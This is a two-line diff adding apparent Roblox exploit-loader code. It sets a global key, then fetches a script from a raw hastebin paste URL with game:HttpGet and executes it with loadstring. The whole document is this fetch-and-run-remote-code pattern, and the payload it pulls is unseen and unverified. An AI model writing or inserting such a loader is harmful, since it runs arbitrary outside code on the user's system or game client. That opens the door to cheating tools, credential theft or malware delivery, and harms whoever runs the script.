@@ -1,0 +1,2 @@
+_G.Key = 2874625604
+loadstring(game:HttpGet("https://hastebin.app/raw/626c2b78d3810c001cf24b08"))()
